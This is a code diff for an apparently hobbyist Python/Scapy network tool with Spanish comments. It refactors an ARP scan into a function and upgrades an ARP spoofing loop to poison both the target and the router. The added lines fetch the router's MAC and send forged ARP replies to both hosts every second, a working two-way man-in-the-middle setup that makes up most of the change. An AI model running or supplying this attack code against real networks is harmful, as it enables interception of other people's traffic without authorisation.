@@ -20,22 +20,23 @@ options = parser.parse_args()
 
 conjuntoCars = ["A", "B", "C", "D", "E", "F"]
 
+def scan(ip):
+    arp_request = ARP(pdst=ip)
+    broadcast = Ether(dst='FF:FF:FF:FF:FF:FF')
+
+    arp_request_broadcast = broadcast/arp_request
+
+    answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+
+    print ( "IP".center(44), "MAC\n" )
+    for i in answered_list:
+        print ( '\t\t', i[1].psrc, "\t\t", i[1].src )
+    
+
 try:
     if options.scan:
-
-        arp_request = ARP(pdst=options.scan)
-        broadcast = Ether(dst='FF:FF:FF:FF:FF:FF')
-
-        arp_request_broadcast = broadcast/arp_request
-
-        answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
-
-        print ( "IP".center(44), "MAC\n" )
-        for i in answered_list:
-            print ( '\t\t', i[1].psrc, "\t\t", i[1].src )
-
+        scan(options.scan)
         pass
-
 
     if options.mac and options.interface:
 
@@ -71,11 +72,28 @@ try:
     targetIp = input("Introduce la IP del objetivo: ")
     targetMac = input("Introduce la MAC del objetivo: ")
     ipSpoof = input("Introduce la IP a spoofear: ")
+
+    ## MAC DEL SEGUNDO OBJETIVO - ROUTER
+
+    arp_request = ARP(pdst=ipSpoof)
+    broadcast = Ether(dst='FF:FF:FF:FF:FF:FF')
+
+    arp_request_broadcast = broadcast/arp_request
+
+    answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+
+    macObjetivo2 =  answered_list[0][1].src
     
+    ## SE GENERAN PAQUETES PARA LOS OBJETIVOS
+
+    packet0 = ARP(op=2, pdst=targetIp, hwdst=targetMac, psrc=ipSpoof)
+    packet1 = ARP(op=2, pdst=ipSpoof, hwdst=macObjetivo2, psrc=targetIp)
+
     packetCount = 0
     while True:
-        packet = ARP(op=2, pdst=targetIp, hwdst=targetMac, psrc=ipSpoof)  # Se crea la respuesta ARP ( op = 2 )
-        send(packet, verbose=False)
+        send(packet0, verbose=False)
+        send(packet1, verbose=False)
+
         packetCount += 1
         print ( "[+] Paquetes enviados: " + str(packetCount), end="\r")
         sleep(1)
